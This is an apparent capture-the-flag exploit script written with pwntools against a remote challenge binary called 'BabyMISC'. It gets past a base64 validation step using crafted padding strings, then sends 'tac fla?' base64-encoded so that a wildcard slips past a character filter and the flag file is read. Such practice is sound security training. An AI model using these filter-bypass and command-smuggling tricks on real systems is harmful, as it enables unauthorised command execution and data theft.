'''
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

1. bypass base64 checking
2. base64 encode "tac fla?" to bypass character limitation
'''

from pwn import *
from base64 import *


local = 0
url, port = "node5.buuoj.cn", 27930
filename = "./BabyMISC"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    # context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    context.log_level = "debug"
    io = remote(url, port)

def B():
    gdb.attach(io)
    pause()

def pwn():
    io.sendlineafter(b'[+] Input > \n', b'TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oih=')
    io.sendlineafter(b'[+] Input 1 \n', b'TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oih=')
    io.sendlineafter(b'[+] Input 2 \n', b'TjBfbTRuX2M0bDFfYWc0aW5fWTNzdDNyZDR5Oih==')
    io.sendlineafter(b'[*] Input > \n', b64encode(b'tac fla?'))


if __name__ == "__main__":
    pwn()
    io.interactive()
